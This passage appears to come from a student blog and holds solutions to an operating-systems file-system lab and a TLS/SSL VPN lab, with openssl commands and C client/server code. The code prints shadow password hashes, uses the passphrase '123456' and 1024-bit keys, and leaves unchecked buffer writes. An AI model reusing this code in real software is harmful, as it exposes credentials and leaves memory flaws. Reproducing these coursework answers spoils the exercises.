the current seek position.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Returns:</span><span class="hljs-comment">// The number of bytes successfully written.</span><span class="hljs-comment">// &lt; 0 on error.</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span>devfile_write(struct Fd *fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> n)&#123;<span class="hljs-comment">// Make an FSREQ_WRITE request to the file system server.  Be</span><span class="hljs-comment">// careful: fsipcbuf.write.req_buf is only so large, but</span><span class="hljs-comment">// remember that write is always allowed to write *fewer*</span><span class="hljs-comment">// bytes than requested.</span><span class="hljs-comment">// LAB 5: Your code here</span><span class="hljs-comment">// panic("devfile_write not implemented");</span>fsipcbuf.<span class="hljs-built_in">write</span>.req_fileid = fd-&gt;fd_file.id;fsipcbuf.<span class="hljs-built_in">write</span>.req_n = MIN(n, PGSIZE);memmove(fsipcbuf.<span class="hljs-built_in">write</span>.req_buf, buf, fsipcbuf.<span class="hljs-built_in">write</span>.req_n);<span class="hljs-keyword">int</span> r = fsipc(FSREQ_WRITE, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">return</span> r;&#125;</code></pre><h1 id="Part-B：Spawning-Processes"><a href="#Part-B：Spawning-Processes" class="headerlink" title="Part B：Spawning Processes"></a>Part B：Spawning Processes</h1><h4 id="Exercise-7"><a href="#Exercise-7" class="headerlink" title="Exercise 7"></a>Exercise 7</h4><blockquote><p><code>spawn</code> relies on the new syscall <code>sys_env_set_trapframe</code> to initialize the state of the newly created environment. Implement <code>sys_env_set_trapframe</code> in <code>kern/syscall.c</code> (don’t forget to dispatch the new system call in <code>syscall()</code>).</p><p>Test your code by running the <code>user/spawnhello</code> program from <code>kern/init.c</code>, which will attempt to spawn <code>/hello</code> from the file system.</p><p>Use make grade to test your code.</p></blockquote><p><strong><code>sys_env_set_trapframe</code></strong></p><p>函数作用是将进程号为 envid 的进程的 TrapFrame 设为 tf ，并且在设置前需要检查 envid 是否存 在</p><pre><code class="hljs c"><span class="hljs-comment">// Set envid's trap frame to 'tf'.</span><span class="hljs-comment">// tf is modified to make sure that user environments always run at code</span><span class="hljs-comment">// protection level 3 (CPL 3), interrupts enabled, and IOPL of 0.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span><span class="hljs-comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span><span class="hljs-comment">//or the caller doesn't have permission to change envid.</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_env_set_trapframe(<span class="hljs-keyword">envid_t</span> envid, struct Trapframe *tf)&#123;<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// Remember to check whether the user has supplied us with a good</span><span class="hljs-comment">// address!</span><span class="hljs-comment">// panic("sys_env_set_trapframe not implemented");</span><span class="hljs-keyword">int</span> r;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> * <span class="hljs-title">e</span>;</span><span class="hljs-keyword">if</span>((r=envid2env(envid, &amp;e, <span class="hljs-number">1</span>))&lt;<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;memmove(&amp;e-&gt;env_tf,tf,<span class="hljs-keyword">sizeof</span>(struct Trapframe));<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h1 id="Part-C：The-Shell"><a href="#Part-C：The-Shell" class="headerlink" title="Part C：The Shell"></a>Part C：The Shell</h1><h4 id="Exercise-10"><a href="#Exercise-10" class="headerlink" title="Exercise 10"></a>Exercise 10</h4><blockquote><p>The shell doesn’t support I/O redirection. It would be nice to run sh &lt;script instead of having to type in all the commands in the script by hand, as you did above. Add I/O redirection for &lt; to <code>user/sh.c</code>.</p><p>Test your implementation by typing sh &lt;script into your shell</p><p>Run make run-testshell to test your shell. <code>testshell</code> simply feeds the above commands (also found in <code>fs/testshell.sh</code>) into the shell and then checks that the output matches <code>fs/testshell.key</code>.</p></blockquote><p>修改<code>user/sh.c</code>中的<code>runcmd()</code>来支持重定向</p><pre><code class="hljs c"><span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// panic("&lt; redirection not implemented");</span><span class="hljs-keyword">if</span> ((fd = <span class="hljs-built_in">open</span>(t, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;cprintf(<span class="hljs-string">"open %s for write: %e"</span>, t, fd);<span class="hljs-built_in">exit</span>();&#125;<span class="hljs-keyword">if</span> (fd != <span class="hljs-number">0</span>) &#123;dup(fd, <span class="hljs-number">0</span>);<span class="hljs-built_in">close</span>(fd);&#125;<span class="hljs-keyword">break</span>;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p align=&quot;right&quot;&gt;姓名：贾昊龙
&lt;/p&gt;&lt;p align=&quot;right&quot;&gt;学号：18307130049

&lt;/p&gt;&lt;h1 id=&quot;PartⅠ：运行结果&quot;&gt;&lt;a href=&quot;#PartⅠ：运行结果&quot; class=&quot;headerlink&quot; title=&quot;PartⅠ：运</summary>
      
    
    
    
    
    <category term="Operating System" scheme="http://yoursite.com/tags/Operating-System/"/>
    
  </entry>
  
  <entry>
    <title>VPN</title>
    <link href="http://yoursite.com/2020/12/22/VPN/"/>
    <id>http://yoursite.com/2020/12/22/VPN/</id>
    <published>2020-12-22T03:14:46.000Z</published>
    <updated>2021-01-04T11:38:20.026Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TLS-SSL-VPN设计基础"><a href="#TLS-SSL-VPN设计基础" class="headerlink" title="TLS/SSL VPN设计基础"></a>TLS/SSL VPN设计基础</h2><ul><li>VPN</li><li>TUN/TAP接口</li><li>路由</li><li>PKI相关</li><li>TLS/SSL加密</li></ul><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="task-1：设置虚拟机"><a href="#task-1：设置虚拟机" class="headerlink" title="task 1：设置虚拟机"></a>task 1：设置虚拟机</h3><table><thead><tr><th align="center">VPN Client/Host U</th><th align="center">10.0.2.4</th></tr></thead><tbody><tr><td align="center"><strong>Gateway</strong></td><td align="center"><strong>10.0.2.5、192.168.60.1</strong></td></tr><tr><td align="center"><strong>Host V</strong></td><td align="center"><strong>192.168.60.101</strong></td></tr></tbody></table><p><img src="/2020/12/22/VPN/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><p>在建立VPN隧道之前，可以看到U是无法ping V的</p><h3 id="task-2：通过TUN-TAP建立VPN隧道"><a href="#task-2：通过TUN-TAP建立VPN隧道" class="headerlink" title="task 2：通过TUN/TAP建立VPN隧道"></a>task 2：通过TUN/TAP建立VPN隧道</h3><p><img src="/2020/12/22/VPN/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><h4 id="step-1：运行VPN-server"><a href="#step-1：运行VPN-server" class="headerlink" title="step 1：运行VPN server"></a>step 1：运行VPN server</h4><p>在Gateway上面按照步骤运行相关命令，之后可以看到对于tun0接口的配置如下，已经有了IP地址<code>192.168.53.1</code></p><p><img src="/2020/12/22/VPN/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><h4 id="step-2：运行VPN-client"><a href="#step-2：运行VPN-client" class="headerlink" title="step 2：运行VPN client"></a>step 2：运行VPN client</h4><p>和上面基本一样</p><p><img src="/2020/12/22/VPN/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p><h4 id="step-3：在client和server端建立路由"><a href="#step-3：在client和server端建立路由" class="headerlink" title="step 3：在client和server端建立路由"></a>step 3：在client和server端建立路由</h4><p>配置好的路由表应该如下</p><ul><li><strong>client端</strong></li></ul><p><img src="/2020/12/22/VPN/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p><ul><li><strong>server端</strong></li></ul><p><img src="/2020/12/22/VPN/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><h4 id="step-4：设置V的路由"><a href="#step-4：设置V的路由" class="headerlink" title="step 4：设置V的路由"></a>step 4：设置V的路由</h4><p>根据对于整个发包流程的认识，其实在这一步我们所需要添加的就是如果包的目的IP是192.168.53.0/24的主机，需要通过<code>enp0s8</code>来发往<code>192.168.60.1</code>，这样当<code>Gateway</code>收到来自<code>host V</code>的回复之后，会通过<code>192.168.53.1</code>端口来进行转发数据包。</p><p><code>host V</code>路由表设置完之后如下</p><p><img src="/2020/12/22/VPN/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p><h4 id="step-5：测试VPN"><a href="#step-5：测试VPN" class="headerlink" title="step 5：测试VPN"></a>step 5：测试VPN</h4><p>首先是terminal上面的显示</p><p><img src="/2020/12/22/VPN/2-8.PNG" srcset="/img/loading.gif" alt="2-8"></p><p>可以看到是能够ping通的，之后来分析wireshark</p><p><img src="/2020/12/22/VPN/2-9.PNG" srcset="/img/loading.gif" alt="2-9"></p><p>其中，ICMP类型的包不是隧道流量，而在<code>10.0.2.4</code>和<code>10.0.2.5</code>之间流动的是隧道流量</p><p>同理，telnet的命令也是如此</p><p><img src="/2020/12/22/VPN/2-10.PNG" srcset="/img/loading.gif" alt="2-10">)<img src="/2020/12/22/VPN/2-11.PNG" srcset="/img/loading.gif" alt="2-11"></p><h4 id="step-6：破洞实验"><a href="#step-6：破洞实验" class="headerlink" title="step 6：破洞实验"></a>step 6：破洞实验</h4><p>当我们在保持telnet连接的时候停止运行vpnclient，此时输入的命令不会显示出来，连接断开</p><p><img src="/2020/12/22/VPN/2-12.PNG" srcset="/img/loading.gif" alt="2-12"></p><p>但是当我们重新建立连接的时候，会显示之前输入的字符串</p><p><img src="/2020/12/22/VPN/2-13.PNG" srcset="/img/loading.gif" alt="2-13"></p><h3 id="task-3：隧道加密"><a href="#task-3：隧道加密" class="headerlink" title="task 3：隧道加密"></a>task 3：隧道加密</h3><p>要保护隧道的完整性以及机密性，其中机密性是通过加密来实现的，完整性可以通过MAC来确保，参考：<a href="https://www.jianshu.com/p/9616b2d29954" target="_blank" rel="noopener">消息认证码MAC</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，直接用是不行的，因为<code>server-key.pem</code>证书过期，但是又不知道<code>cacert.pem</code>的密码，所以不能用原来的<code>cacert.pem</code>来为服务端重新签名一个证书，所以只能是自己生成一个根证书，之后再用自己的根证书给服务器签名，在这里，我们将服务端的域名命名为<code>jhlvpn.com</code></p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>在<code>cert_server</code>文件夹中</p><ul><li>首先生成自签名的根证书<code>cacert.pem</code>，运行命令</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">openssl</span> <span class="hljs-selector-tag">req</span> <span class="hljs-selector-tag">-new</span> <span class="hljs-selector-tag">-x509</span> <span class="hljs-selector-tag">-keyout</span> <span class="hljs-selector-tag">cakey</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-out</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-config</span> <span class="hljs-selector-tag">openssl</span><span class="hljs-selector-class">.cnf</span> <span class="hljs-selector-tag">-days</span> 3650</code></pre><p>之后需要设定文件密码，为<code>123456</code>，然后填写相关内容</p><p><img src="/2020/12/22/VPN/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>会生成<code>cacert.pem</code>文件和<code>cakey.pem</code>，即CA的证书文件和私钥</p><ul><li>之后，服务器产生一对私钥，采用des3加密</li></ul><pre><code class="hljs angelscript">openssl genrsa -des3 -<span class="hljs-keyword">out</span> server-key.pem <span class="hljs-number">1024</span></code></pre><p>文件密码还是<code>123456</code></p><ul><li>然后根据证书生成证书请求文件<code>server-csr.pem</code></li></ul><pre><code class="hljs pgsql">openssl req -<span class="hljs-built_in">new</span> -key <span class="hljs-keyword">server</span>-key.pem -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>-csr.pem -config openssl.cnf</code></pre><p><img src="/2020/12/22/VPN/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><ul><li>生成服务端签名证书</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">openssl</span> <span class="hljs-selector-tag">ca</span> <span class="hljs-selector-tag">-in</span> <span class="hljs-selector-tag">server-csr</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-out</span> <span class="hljs-selector-tag">server-cert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-cert</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-keyfile</span> <span class="hljs-selector-tag">cakey</span><span class="hljs-selector-class">.pem</span><span class="hljs-selector-tag">-config</span> <span class="hljs-selector-tag">openssl</span><span class="hljs-selector-class">.cnf</span> <span class="hljs-selector-tag">-days</span> 3650</code></pre><ul><li><p>之后把<code>cacert.pem</code>文件复制到<code>ca_client</code>文件夹下面</p></li><li><p>之后生成散列值并且利用散列值创建符号链接</p></li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">openssl</span> <span class="hljs-selector-tag">x509</span> <span class="hljs-selector-tag">-in</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> <span class="hljs-selector-tag">-noout</span> <span class="hljs-selector-tag">-subject_hash</span><span class="hljs-selector-tag">ln</span> <span class="hljs-selector-tag">-s</span> <span class="hljs-selector-tag">cacert</span><span class="hljs-selector-class">.pem</span> 3<span class="hljs-selector-tag">de75e64</span><span class="hljs-selector-class">.0</span></code></pre><p>之后运行程序，成功</p><ul><li><strong>server端</strong></li></ul><p><img src="/2020/12/22/VPN/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><ul><li><strong>client端</strong></li></ul><p><img src="/2020/12/22/VPN/3-5.PNG" srcset="/img/loading.gif" alt="3-5"></p><p>同时，对wireshark抓包结果进行分析</p><p><img src="/2020/12/22/VPN/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><p>首先，能明显看到TCP连接建立的握手过程（SYN、ACK包）、数据传输的过程以及断开连接的过程（FIN、ACK包），同时随便选择一个数据包，分析Data字段，可以看到是加密传输，不是明文传输</p><p><img src="/2020/12/22/VPN/3-6.PNG" srcset="/img/loading.gif" alt="3-6"></p><h3 id="task-4：VPN服务器验证"><a href="#task-4：VPN服务器验证" class="headerlink" title="task 4：VPN服务器验证"></a>task 4：VPN服务器验证</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>在建立VPN之前，要对VPN服务器进行验证，是通过使用公钥证书的方式来实现的</p><p>具体分为三部：1.首先要验证服务器证书有效 2.验证服务器是证书的所有者 3.验证服务器是目标服务器</p><h4 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h4><ul><li><p><strong>指出执行上述验证的代码行</strong></p><p>  首先，验证部分包括服务端发送服务器证书以及客户端对于证书的验证过程</p><p>  <strong>server</strong></p></li></ul><pre><code class="hljs c"><span class="hljs-comment">// Step 0: OpenSSL library initialization </span><span class="hljs-comment">// This step is no longer needed as of version 1.1.0.</span>SSL_library_init();<span class="hljs-comment">//进行协议初始化工作</span>SSL_load_error_strings();<span class="hljs-comment">//加载错误信息</span>SSLeay_add_ssl_algorithms();<span class="hljs-comment">//添加SSL加密算法</span><span class="hljs-comment">// Step 1: SSL context initialization</span>meth = (SSL_METHOD *)TLSv1_2_method();ctx = SSL_CTX_new(meth);<span class="hljs-comment">//创建会话环境</span>SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//指定握手阶段的证书验证方式，SSL_VERIFY_NONE表示完全忽略验证证书的结果</span><span class="hljs-comment">// Step 2: Set up the server certificate and private key</span>SSL_CTX_use_certificate_file(ctx, <span class="hljs-string">"./cert_server/server-cert.pem"</span>, SSL_FILETYPE_PEM);SSL_CTX_use_PrivateKey_file(ctx, <span class="hljs-string">"./cert_server/server-key.pem"</span>, SSL_FILETYPE_PEM);<span class="hljs-comment">//加载服务端证书和私钥</span><span class="hljs-comment">// Step 3: Create a new SSL structure for a connection</span>ssl = SSL_new (ctx);</code></pre><p>​    <strong>client</strong></p><pre><code class="hljs c"><span class="hljs-function">SSL* <span class="hljs-title">setupTLSClient</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* hostname)</span></span><span class="hljs-function"></span>&#123;   <span class="hljs-comment">// Step 0: OpenSSL library initialization </span>   <span class="hljs-comment">// This step is no longer needed as of version 1.1.0.</span>   SSL_library_init();   SSL_load_error_strings();   SSLeay_add_ssl_algorithms();   SSL_METHOD *meth;   SSL_CTX* ctx;   SSL* ssl;   meth = (SSL_METHOD *)TLSv1_2_method();   ctx = SSL_CTX_new(meth);   SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//SSL_VERIFY_PEER表示希望验证对方证书</span>   <span class="hljs-keyword">if</span>(SSL_CTX_load_verify_locations(ctx,<span class="hljs-literal">NULL</span>, CA_DIR) &lt; <span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//SSL_CTX_load_verify_locations为CA证书所在目录，这里实现了上面所说的步骤一对于服务器证书的验证：利用CA_DIR目录下面的CA证书去验证服务器证书是否有效</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error setting the verify locations. \n"</span>);<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);   &#125;   ssl = SSL_new (ctx);   X509_VERIFY_PARAM *vpm = SSL_get0_param(ssl);    X509_VERIFY_PARAM_set1_host(vpm, hostname, <span class="hljs-number">0</span>);<span class="hljs-comment">//实现步骤三对于hostname的验证，检查服务器hostname</span>   <span class="hljs-keyword">return</span> ssl;&#125;</code></pre><p>而第二步的检查在验证证书合法性的时候就已经验证了</p><h3 id="task-5：VPN客户端验证"><a href="#task-5：VPN客户端验证" class="headerlink" title="task 5：VPN客户端验证"></a>task 5：VPN客户端验证</h3><p>在这一个task当中，我们需要对VPN客户端进行验证，client会向server端发送username和password，之后server端通过shadow文件匹配来验证对方身份</p><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>在server端加入对用户信息的请求，用户在终端上输入username以及password，参考文档的3.3节</p><h4 id="具体实现-2"><a href="#具体实现-2" class="headerlink" title="具体实现"></a>具体实现</h4><ul><li>在server端添加<code>loginrequest()</code>函数，以及通过<code>login()</code>来进行信息的验证</li></ul><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">loginRequest</span><span class="hljs-params">(SSL* ssl,<span class="hljs-keyword">int</span> sock)</span></span>&#123;    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<span class="hljs-keyword">char</span> username[<span class="hljs-number">1024</span>];<span class="hljs-keyword">char</span> password[<span class="hljs-number">1024</span>];    <span class="hljs-comment">//将请求用户名的语句SSL_write到Client,从client端读取到的后面的输入字符串SSL_read到username</span><span class="hljs-keyword">char</span>* requsr = <span class="hljs-string">"Please enter username:"</span>;SSL_write(ssl,requsr,<span class="hljs-built_in">strlen</span>(requsr));<span class="hljs-keyword">int</span> usrlen = SSL_read(ssl,username,<span class="hljs-keyword">sizeof</span>(username)<span class="hljs-number">-1</span>);username[usrlen] = <span class="hljs-string">'\0'</span>;    <span class="hljs-comment">//将请求用户口令的语句SSL_write到Client,从client端读取到的输入字符串SSL_read到 password</span><span class="hljs-keyword">char</span>* reqpsd = <span class="hljs-string">"Please enter password:"</span>;SSL_write(ssl,reqpsd,<span class="hljs-built_in">strlen</span>(reqpsd));<span class="hljs-keyword">int</span> psdlen = SSL_read(ssl,password,<span class="hljs-keyword">sizeof</span>(password)<span class="hljs-number">-1</span>);password[psdlen] = <span class="hljs-string">'\0'</span>;    login(username,password); <span class="hljs-comment">//检查shadow文件中是否有该用户的信息</span>&#125;</code></pre><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *user, <span class="hljs-keyword">char</span> *passwd)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spwd</span> *<span class="hljs-title">pw</span>;</span><span class="hljs-keyword">char</span> *epasswd;pw = getspnam(user);<span class="hljs-keyword">if</span> (pw == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Login name: %s\n"</span>, pw-&gt;sp_namp);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Passwd : %s\n"</span>, pw-&gt;sp_pwdp);epasswd = crypt(passwd, pw-&gt;sp_pwdp);<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(epasswd, pw-&gt;sp_pwdp)) &#123;<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;&#125;</code></pre><p>对<code>main()</code>函数中只需要在处理client的GET请求的<code>processRequest()</code>函数之前加上<code>loginrequest()</code>即可</p><ul><li>client端在收到来自于server端的用户信息的请求之后，就直接<code>scanf()</code>输入即可，但是要求用户密码不可见，就用<code>getpass()</code>函数即可</li></ul><pre><code class="hljs c"><span class="hljs-built_in">printf</span> (<span class="hljs-string">"SSL connection using %s\n"</span>, SSL_get_cipher(ssl));<span class="hljs-comment">/*----------------Send username &amp; password-------------*/</span><span class="hljs-keyword">int</span> len1;<span class="hljs-keyword">char</span> username[<span class="hljs-number">20</span>];<span class="hljs-keyword">char</span>* password;<span class="hljs-keyword">char</span> usrbuf[<span class="hljs-number">1000</span>];<span class="hljs-keyword">char</span> pwdbuf[<span class="hljs-number">1000</span>];len1 = SSL_read (ssl, usrbuf, <span class="hljs-keyword">sizeof</span>(usrbuf)<span class="hljs-number">-1</span>);<span class="hljs-comment">//SSL_read来获取Server的请求用户名的信息</span>usrbuf[len1] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, usrbuf);<span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s:"</span>,username);SSL_write (ssl,username,<span class="hljs-built_in">strlen</span>(username));<span class="hljs-comment">//将username通过SSL_write到Server</span>len1 = SSL_read (ssl, pwdbuf, <span class="hljs-keyword">sizeof</span>(pwdbuf)<span class="hljs-number">-1</span>);<span class="hljs-comment">//SSL_read到Server的请求用户口令的信息</span>pwdbuf[len1] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s"</span>, pwdbuf);password = getpass(<span class="hljs-string">""</span>);SSL_write(ssl,password,<span class="hljs-built_in">strlen</span>(password));<span class="hljs-comment">//将password SSL_write到Server</span><span class="hljs-comment">/*----------------Send/Receive data --------------------*/</span></code></pre><p>运行结果如下：</p><p><strong>client端</strong></p><p><img src="/2020/12/22/VPN/5-3.PNG" srcset="/img/loading.gif" alt="5-3"></p><p><strong>server端</strong></p><p><img src="/2020/12/22/VPN/5-1.PNG" srcset="/img/loading.gif" alt="5-1"></p><p>而当我们没有正确的输入用户名和密码的时候，用户端会直接退出</p><p><img src="/2020/12/22/VPN/5-4.PNG" srcset="/img/loading.gif" alt="5-4"></p><h3 id="task-6：支持多进程"><a href="#task-6：支持多进程" class="headerlink" title="task 6：支持多进程"></a>task 6：支持多进程</h3><p><img src="/2020/12/22/VPN/6-1.PNG" srcset="/img/loading.gif" alt="6-1"></p><p>在之前的task当中，我们只是实现了数据的加密传输（SSL），但是还没有完全的实现VPN，因为没用通过使用TUN接口来构建VPN隧道，所以接下来我们实际要实现的就是在多进程的条件下来实现我们对于TUN接口的使用</p><ul><li><strong>client端</strong></li></ul><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">createTunDevice</span><span class="hljs-params">()</span> </span><span class="hljs-function"></span>&#123;<span class="hljs-comment">//该函数的作用就是新建一个tun接口并且返回对应的文件描述符，无需修改，直接加到tlsclient即可</span>   <span class="hljs-keyword">int</span> tunfd;   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));   ifr.ifr_flags = IFF_TUN | IFF_NO_PI;     tunfd = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/dev/net/tun"</span>, O_RDWR);   ioctl(tunfd, TUNSETIFF, &amp;ifr);          <span class="hljs-keyword">return</span> tunfd;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, SSL* ssl)</span></span>&#123;<span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from TUN\n"</span>);    bzero(buff, BUFF_SIZE);len = <span class="hljs-built_in">read</span>(tunfd, buff, BUFF_SIZE);<span class="hljs-comment">//read函数将从tunfd当中的数据读取到buff当中</span><span class="hljs-comment">//sendto(sockfd, buff, len, 0, (struct sockaddr *) &amp;peerAddr,sizeof(peerAddr));</span>SSL_write(ssl,buff,len);<span class="hljs-comment">//写给ssl套接字</span>&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, SSL* ssl)</span></span>&#123;<span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from the tunnel\n"</span>);    bzero(buff, BUFF_SIZE);<span class="hljs-comment">//len = recvfrom(sockfd, buff, BUFF_SIZE, 0, NULL, NULL);</span>len = SSL_read(ssl,buff,<span class="hljs-keyword">sizeof</span>(buff)<span class="hljs-number">-1</span>);<span class="hljs-built_in">write</span>(tunfd, buff, len);<span class="hljs-comment">//写给tunfd来进行外层的解包</span>&#125;</code></pre><ul><li><strong>server端</strong>，所需要的函数和上面基本一样，在main里面的修改如下</li></ul><pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;    <span class="hljs-keyword">int</span> sock = accept(listen_sock, (struct sockaddr*)&amp;sa_client, &amp;client_len);    <span class="hljs-keyword">if</span> (fork() == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// The child process</span>       <span class="hljs-built_in">close</span> (listen_sock);       SSL_set_fd (ssl, sock);       <span class="hljs-keyword">int</span> err = SSL_accept (ssl);       CHK_SSL(err);       <span class="hljs-built_in">printf</span> (<span class="hljs-string">"SSL connection established!\n"</span>);       loginrequest(ssl, sock);       processRequest(ssl, sock);       <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;          fd_set readFDSet;          FD_ZERO(&amp;readFDSet);          FD_SET(sock, &amp;readFDSet);          FD_SET(tunfd, &amp;readFDSet);          select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);          <span class="hljs-keyword">if</span> (FD_ISSET(tunfd, &amp;readFDSet)) tunSelected(tunfd, ssl);          <span class="hljs-keyword">if</span> (FD_ISSET(sock, &amp;readFDSet)) socketSelected(tunfd, ssl);       &#125;       <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// The parent process</span>        <span class="hljs-built_in">close</span>(sock);    &#125;  &#125;</code></pre><p>之后就按照task 2的一些步骤来弄就行</p><h4 id="pipe实现"><a href="#pipe实现" class="headerlink" title="pipe实现"></a>pipe实现</h4><p>在pipe的是相当中，会区分父子进程，父进程负责将从tun接口收到的数据发给子进程，而子进程有两种情况要处理，第一种是将来自父进程的数据通过通过ssl/tls发给客户端进程，第二种是将来自于客户端的程序传递给tun接口</p><p>具体实现</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunPipeSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> pipefd)</span> </span>&#123;    <span class="hljs-comment">//该函数的作用是实现父进程的作用，从tun接口通过read来把数据读取到pipe的输出端口上</span><span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from TUN Interface\n"</span>);    bzero(buff, BUFF_SIZE);len = <span class="hljs-built_in">read</span>(tunfd, buff, BUFF_SIZE);buff[len] = <span class="hljs-string">'\0'</span>;<span class="hljs-built_in">write</span>(pipefd, buff, len);&#125;</code></pre><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pipeSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pipefd, <span class="hljs-keyword">int</span> sockfd, SSL *ssl)</span> </span>&#123;    <span class="hljs-comment">//该函数的作用是实现子进程从父进程通过pipe来得到的数据写入到ssl的socket上</span><span class="hljs-keyword">int</span> len;<span class="hljs-keyword">char</span> buff[BUFF_SIZE];<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Got a packet from TUN Interface\n"</span>);    bzero(buff, BUFF_SIZE);len = <span class="hljs-built_in">read</span>(pipefd, buff, BUFF_SIZE);buff[len] = <span class="hljs-string">'\0'</span>;SSL_write(ssl, buff, len);&#125;</code></pre><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pipefd, <span class="hljs-keyword">int</span> sockfd, SSL *ssl, <span 